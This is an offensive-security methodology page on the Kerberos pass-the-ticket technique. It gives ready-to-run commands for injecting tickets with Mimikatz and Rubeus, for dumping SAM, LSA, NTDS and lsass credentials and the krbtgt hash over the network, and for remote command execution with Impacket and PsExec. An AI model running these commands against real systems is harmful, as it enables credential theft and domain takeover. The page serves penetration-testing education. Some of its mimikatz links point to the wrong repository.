---
description: MITRE ATT&CK™ Sub-technique T1550.003
---

# Pass the ticket

## Theory

[Overpass-the-hash](overpass-the-hash.md), [silver ticket](forged-tickets.md#silver-ticket) and [golden ticket](forged-tickets.md#golden-ticket) attacks are used by attackers to obtain illegitimate tickets. A ticket \(TGT or service ticket, forged or not\) can then be used to authenticate to a system using Kerberos without knowing any password. This is called [Pass-the-ticket](pass-the-ticket.md).

## Practice

### Injecting the ticket

* On Windows systems, tools like [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus) inject the ticket in memory. Native Microsoft tools can then use the ticket just like usual.
* On UNIX-like systems, the path to the `.ccache` ticket to use has to be referenced in the environment variable `KRB5CCNAME`

{% tabs %}
{% tab title="UNIX-like" %}
Once a ticket is obtained/created, it needs to be referenced in the `KRB5CCNAME` environment variable for it to be used by others tools.

```bash
export KRB5CCNAME=$path_to_ticket.ccache
```
{% endtab %}

{% tab title="Windows" %}
The most simple way of injecting the ticket is to supply the `/ptt` flag directly to the command used to request/create a ticket. Both [mimikatz](https://github.com/GhostPack/Rubeus) and [Rubeus](https://github.com/GhostPack/Rubeus) accept this flag.

This can also be done manually with [mimikatz](https://github.com/GhostPack/Rubeus) or [Rubeus](https://github.com/GhostPack/Rubeus).

```bash
kerberos::ptt $ticket_kirbi_file
```

```bash
Rubeus.exe ptt /ticket:$ticket_kirbi_file
```

It is then possible to list the tickets in memory using the `klist` command.
{% endtab %}
{% endtabs %}

### Passing the ticket

* On Windows, once Kerberos tickets are injected, they can be used natively.
* On UNIX-like systems, once the `KRB5CCNAME` variable is exported, the ticket can be used by tools that support Kerberos authentication.

{% tabs %}
{% tab title="Credentials dumping" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) scripts like [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) \(Python\) have the ability to remotely dump hashes and LSA secrets from a machine.

```bash
secretsdump.py -k $TARGET
```

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) \(see [dumping credentials from registry hives](../credentials/dumping/#windows-computer-registry-hives)\).

```bash
crackmapexec smb $TARGETS -k --sam
crackmapexec smb $TARGETS -k --lsa
crackmapexec smb $TARGETS -k --ntds
```

[Lsassy](https://github.com/Hackndo/lsassy) \(Python\) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) module \(see [dumping credentials from lsass process memory](../credentials/dumping/#windows-computer-lsass-exe)\).

```bash
crackmapexec smb $TARGETS -k -M lsassy
crackmapexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
lsassy -k $TARGETS
```

On Windows, once the ticket is injected, it will natively be used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash.

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```
{% endtab %}

{% tab title="Command execution" %}
Some [Impacket](https://github.com/SecureAuthCorp/impacket) scripts \(Python\) enable testers to execute commands on target systems with Kerberos support.

```bash
psexec.py -k 'DOMAIN/USER@TARGET'
smbexec.py -k 'DOMAIN/USER@TARGET'
wmiexec.py -k 'DOMAIN/USER@TARGET'
atexec.py -k 'DOMAIN/USER@TARGET'
dcomexec.py -k 'DOMAIN/USER@TARGET'
```

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\) has the ability to do it on a set of targets

```bash
crackmapexec winrm $TARGETS -k -x whoami
crackmapexec smb $TARGETS -k -x whoami
```

On Windows, legitimate tools like the [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) \([download](https://live.sysinternals.com/)\) can then be used to open a cmd using that ticket.

```bash
.\PsExec.exe -accepteula \\$TARGET cmd
```
{% endtab %}
{% endtabs %}

## Resources

